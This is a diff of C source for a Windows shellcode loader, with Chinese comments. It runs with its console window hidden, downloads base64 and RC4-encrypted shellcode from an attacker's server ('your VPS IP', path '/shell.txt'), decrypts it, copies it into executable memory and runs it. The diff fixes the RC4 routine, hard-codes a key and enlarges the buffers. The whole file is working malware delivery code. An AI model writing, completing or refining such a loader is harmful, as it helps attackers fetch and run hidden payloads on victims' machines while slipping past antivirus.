@@ -1,18 +1,17 @@
 ﻿#ifdef _MSC_VER
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #endif
-#include <iostream>
 #include <Windows.h>
 #include <stdlib.h>  
 #include <string.h>
 #pragma comment(lib, "ws2_32.lib")
 
-unsigned char key[] = ""; /*RC4key,跟generator中的要一致*/
-const char* IP = "";      /*your VPS IP*/
-int Base64ShellLen = ;    /*generator中给出的长度*/
+unsigned char key[] = "ljjdfjdjdjs2803u8jc3344cxv121212";  /*RC4key,跟generator中的要一致*/
+const char* IP = ""; /*your VPS IP*/
+const char* path = "/shell.txt"; /* 服务器中shellcode的路径 */
+int Base64ShellLen = ;  /*generator中给出的长度*/
 
-
-unsigned char* base64_decode(unsigned char* code)
+void base64_decode(unsigned char* code)
 {
     //根据base64表，以字符找到对应的十进制数据  
     int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
@@ -30,7 +29,7 @@ unsigned char* base64_decode(unsigned char* code)
     };
     long len;
     long str_len;
-    unsigned char* res;
+    unsigned char* res = NULL;
     int i, j;
 
     //计算解码后的字符串长度  
@@ -43,8 +42,7 @@ unsigned char* base64_decode(unsigned char* code)
     else
         str_len = len / 4 * 3;
 
-    res = (unsigned char*)malloc(sizeof(unsigned char) * str_len + 1);
-    res[str_len] = '\0';
+    res = (unsigned char*)calloc(sizeof(unsigned char) * str_len + 3, 1);
 
     //以4个字符为一位进行解码  
     for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
@@ -53,9 +51,9 @@ unsigned char* base64_decode(unsigned char* code)
         res[j + 1] = (((unsigned char)table[code[i + 1]]) << 4) | (((unsigned char)table[code[i + 2]]) >> 2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
         res[j + 2] = (((unsigned char)table[code[i + 2]]) << 6) | ((unsigned char)table[code[i + 3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
     }
-
-    return res;
-
+    RtlMoveMemory(code, res, len);
+    free(res);
+    res = NULL;
 }
 
 
@@ -77,11 +75,13 @@ char* GetCode(const char* host)
         return 0;
 
     //发送请求
-    char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";
+    char request[1024] = "GET ";
+    strcat_s(request, path);
+    strcat_s(request, " HTTP/1.1\r\nHost:");
     strcat_s(request, host);
     strcat_s(request, "\r\nConnection:Close\r\n\r\n");
     int ret = send(sock, request, strlen(request), 0);
-    const int bufsize = 4096;
+    const int bufsize = 6144;
     char* buf = (char*)calloc(bufsize, 1);
     ret = recv(sock, buf, bufsize - 1, 0);
     while (TRUE) {
@@ -132,35 +132,39 @@ void re_Sbox(unsigned char* S, unsigned char* T)
 void RC4(unsigned char* text, unsigned char* key, int txtlen)
 {
     unsigned char S[256] = { 0 };
-    int i, k;
+    int i, j, m;
+    unsigned char k = 0;
     unsigned char T[256] = { 0 };
     re_S(S);
     re_T(T, key);
     re_Sbox(S, T);
-    i = k = 0;
-    while (k < txtlen)
+    i = j = m = 0;
+    while (m < txtlen)
     {
-        text[k] = text[k] ^ S[i];
+
         i = (i + 1) % 256;
-        k++;
+        j = (j + S[i]) % 256;
+        swap(&S[i], &S[j]);
+        k = text[m] ^ (S[(S[i] + S[j]) % 256]);
+        text[m] = k;
+        m++;
     }
 }
 //-----------------------RC4---------------------------------//
 
 int main()
 {
-    char* raw = 0;   
+    char* raw = 0;
     raw = GetCode(IP);
     int len = strlen(raw);
-    unsigned char* Scode = (unsigned char*)calloc(2048, 1);
+    unsigned char* Scode = (unsigned char*)calloc(6144, 1);
     RtlMoveMemory(Scode, raw, len);
-    Scode = base64_decode(Scode);
+    base64_decode(Scode);
     len = Base64ShellLen;
     RC4(Scode, key, len);
-    Scode = base64_decode(Scode);
+    base64_decode(Scode);
     void* exec = VirtualAlloc(0, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     RtlMoveMemory(exec, Scode, 1024);
     ((void(*)())exec)();
     return 0;
 }
-
